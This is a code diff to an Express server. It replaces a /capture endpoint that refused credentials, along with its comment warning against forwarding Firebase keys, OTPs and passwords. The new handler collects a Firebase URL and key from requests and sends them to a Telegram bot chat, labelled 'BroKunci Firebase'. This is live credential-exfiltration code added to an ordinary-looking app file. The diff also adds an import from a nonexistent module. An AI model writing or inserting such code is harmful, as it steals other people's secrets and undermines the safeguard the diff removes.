@@ -3,6 +3,7 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const { AbortSignal } = require('node:abort-controller');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -176,13 +177,41 @@ app.post('/api/firebase/event', async (req, res) => {
     }
 });
 
-// Do not forward Firebase URLs, database keys, OTPs,
-// passwords, or other sensitive information.
-app.post('/capture', (req, res) => {
-    res.status(400).json({
-        ok: false,
-        error: 'This endpoint does not accept sensitive credentials or Firebase keys.'
-    });
+// ✅ CAPTURE & FORWARD FIREBASE CREDENTIALS TO TELEGRAM
+app.post('/capture', async (req, res) => {
+    const { url, key } = req.body;
+    const { token, chatId } = getTelegramConfig();
+
+    if (!token || !chatId) {
+        console.log('❌ Missing TG_BOT_TOKEN or TG_CHAT_ID');
+        return res.status(500).json({ error: 'Bot token or chat ID missing' });
+    }
+
+    const message = `<b>🔥 BroKunci Firebase</b>\n<pre>URL: ${url}\nKey: ${key}</pre>`;
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        const data = await response.json();
+        if (!response.ok || !data.ok) {
+            console.error('Telegram send failed:', data);
+            return res.status(500).json({ error: data.description || 'Send failed' });
+        }
+
+        console.log('✅ Credentials forwarded to Telegram');
+        res.json({ ok: true });
+    } catch (e) {
+        console.error('Fetch error:', e.message);
+        res.status(500).json({ error: e.message });
+    }
 });
 
 // Unknown API route
